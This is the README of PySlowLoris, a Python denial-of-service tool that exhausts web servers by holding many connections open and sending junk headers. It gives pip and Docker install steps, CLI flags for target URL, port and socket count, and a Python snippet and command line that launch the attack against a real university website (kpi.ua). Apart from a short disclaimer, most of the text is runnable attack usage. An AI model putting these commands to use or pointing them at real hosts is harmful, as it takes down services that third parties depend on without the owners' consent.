# PySlowLoris
[![Gitter chat](https://badges.gitter.im/gitterHQ/gitter.png)](https://gitter.im/SlowLoris-dev/Lobby)
[![License](https://img.shields.io/badge/license-MIT%20license-orange.svg)](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE)
[![Python](https://img.shields.io/badge/python-2.7-blue.svg)](https://github.com/maxkrivich/SlowLoris)
[![Build Status](https://travis-ci.org/maxkrivich/SlowLoris.svg?branch=master)](https://travis-ci.org/maxkrivich/SlowLoris)
[![Coverage Status](https://coveralls.io/repos/github/maxkrivich/SlowLoris/badge.svg?branch=master)](https://coveralls.io/github/maxkrivich/SlowLoris?branch=master)
[![Requirements Status](https://requires.io/github/maxkrivich/SlowLoris/requirements.svg?branch=master)](https://requires.io/github/maxkrivich/SlowLoris/requirements/?branch=master)
[![Code Health](https://landscape.io/github/maxkrivich/SlowLoris/master/landscape.svg?style=flat)](https://landscape.io/github/maxkrivich/SlowLoris/master)

This repository was created for testing Slow Loris vulnerability on different web servers. SL based on keeping alive open connection as long as possible and sending some trash headers to the server. If you are interested what I'm trying doing here, please join my team and let's do fun together. Please DO NOT use this in the real attacks on the servers.

The main reason why I'm writing this module it is to create the easy tool for the fast check a small personal or corporate web server what based on Apache and etc. Also, last but not least reason is to improve my skills in this sphere.

More information you can find [here].

### Install module

##### PyPi
Installing module form PyPi:
```sh
$ pip install pyslowloris
```

##### Docker
Pulling from Docker hub:
```sh
$ docker pull maxkivich/pyslowloris
$ docker run --rm -it maxkivich/pyslowloris [-h] [-u URL] [-p PORT] [-s SOCKET_COUNT]
```

Build from Dockerfile:
```sh
$ docker build -t pyslowloris .
$ docker run --rm -it pyslowloris [-h] [-u URL] [-p PORT] [-s SOCKET_COUNT]
```

##### For contributors
```sh
$ git clone https://github.com/maxkrivich/SlowLoris.git
$ cd SlowLoris
$ vitualenv --python=[python version] venv
$ source venv/bin/active
$ pip install --editable .
```

### Usage
```sh
usage: slowloris [-h] [-u URL] [-s SOCKET_COUNT] [-p PORT]

Small and simple tool for testing Slow Loris vulnerability @maxkrivich

optional arguments:
  -h, --help            Show this help message and exit
  -u URL, --url URL     Link to the web server (http://google.com) - str
  -s SOCKET_COUNT, --socket-count SOCKET_COUNT Maximum count of created connection (default value
                        300) - int
  -p PORT, --port PORT  Port what will be used - int

```

#### Code example
Here are some example to start attack via Python
```py
import time
from PySlowLoris import TargetInfo, SlowLorisAttack

target = TargetInfo(url="http://kpi.ua/", port=80)
target.get_info()
slowloris = SlowLorisAttack(target)
slowloris.start_attack() # stop_attack()

while True:
    time.sleep(1)

```

#### Using module via CLI
The following command helps to use module via command line
```sh
$ slowloris -u http://kpi.ua/ -s 300
```


###### stop execution: Ctrl + C

If you find [bugs] or have [suggestions] about improving the module, don't hesitate to contact [me].

### License
Copyright (c) 2017 Maxim Krivich, [maxkrivich.github.io](https://maxkrivich.github.io/)

Licensed under the MIT License



[here]: <https://en.wikipedia.org/wiki/Slowloris_(computer_security)>
[bugs]: <https://github.com/maxkrivich/SlowLoris/issues>
[suggestions]: <https://github.com/maxkrivich/SlowLoris/issues>
[me]: <https://maxkrivich.github.io>
